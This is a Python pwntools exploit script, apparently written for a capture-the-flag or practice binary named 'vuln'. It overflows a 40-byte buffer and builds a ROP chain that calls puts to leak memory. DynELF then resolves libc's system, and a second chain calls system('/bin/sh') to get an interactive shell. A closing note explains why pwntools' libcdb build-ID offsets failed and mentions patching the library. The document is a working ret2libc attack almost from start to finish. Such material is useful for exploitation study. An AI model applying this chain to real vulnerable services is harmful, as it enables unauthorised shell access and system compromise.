#Python3.7 it works

from pwn import *

context(arch='amd64', word_size=64, os='linux', timeout=0.25)#, log_level='debug')

@MemLeak
def leak(address):
	if "\n" in hex(address): return ""
	rop = ROP(elf)
	payload_base = "A"*40
	poprdi = rop.find_gadget(["pop rdi","ret"])
	payload = payload_base.encode()
	payload += p64(poprdi.address)
	payload += p64(address)  #first is 0x400000, it is the base without pie
	payload += p64(0x401050)#elf.plt['puts']) .plt not working with python2
	payload += p64(elf.symbols['_start'])
	r.recvuntil("ROP.\n")
	r.recvline()
	r.sendline(payload)
	value = r.recvuntil(b'S')[:-2] + '\0'.encode()  #recv is equal to read
	return value


def exploit(system, libc):
	rop = ROP(elf)
	payload = "A".encode()*40
	ret = rop.find_gadget(["ret"])
	log.info("RET found ad " + hex(ret.address))
	binsh = next(libc.search("/bin/sh\x00".encode()))
	log.success("sh found at " + str(hex(binsh)))
	popret = rop.find_gadget(["pop rdi","ret"])
	payload += p64(ret.address)
	payload += p64(popret.address)
	payload += p64(binsh)
	payload += p64(system)
	r.sendline(payload)

name = './vuln'
elf = ELF(name)
r = process(name, stdin=PTY)

de = DynELF(leak, elf.symbols['puts'])
system = de.lookup('system','libc')
log.success("System found at: " + hex(system))
#gdb.attach(r)

libc = de.libc  #This need to update the ID offset as described below
exploit(system, libc)
r.interactive()


"""
Build ID has wrong offset into libcdb library 

root@ee8ae5f2db4b:/home/exploitation/libc-database/db# readelf -SW $(file -L * | grep -i "x86-64" | cut -d ':' -f 1) | grep .note.gnu.build-id | sort | uniq -c
      7   [ 1] .note.gnu.build-id NOTE            00000000000001c8 0001c8 000024 00   A  0   0  4
      8   [ 1] .note.gnu.build-id NOTE            0000000000000238 000238 000024 00   A  0   0  4
     76   [ 1] .note.gnu.build-id NOTE            0000000000000270 000270 000024 00   A  0   0  4
      4   [ 1] .note.gnu.build-id NOTE            00000000000002e0 0002e0 000024 00   A  0   0  4
     40   [ 1] .note.gnu.build-id NOTE            00000174 000174 000024 00   A  0   0  4
      6   [ 1] .note.gnu.build-id NOTE            00000194 000194 000024 00   A  0   0  4
      4   [ 1] .note.gnu.build-id NOTE            000001b4 0001b4 000024 00   A  0   0  4
     22   [ 1] .note.gnu.build-id NOTE            000001d4 0001d4 000024 00   A  0   0  4
      6   [ 2] .note.gnu.build-id NOTE            0000000000000310 000310 000024 00   A  0   0  4
     14   [ 2] .note.gnu.build-id NOTE            0000000000000370 000370 000024 00   A  0   0  4
      8   [ 2] .note.gnu.build-id NOTE            0000000000000380 000380 000024 00   A  0   0  4

These are the offsets

Here there are only 3 of them : https://github.com/Gallopsled/pwntools/blob/11f34c3bc5afc359d9ec9ecee47047d3811e79d4/pwnlib/libcdb.py#L250

'amd64': [0x270, 0x174, 0x2e0, 0x370]

That's wy the error was:
[*] Build ID not found at offset 0x270
[*] Build ID not found at offset 0x174
[*] Build ID not found at offset 0x2e0
[*] Build ID not found at offset 0x370

I have to patch the library /usr/local/lib/python3.10/dist-packages/pwnlib/libcdb.py
"""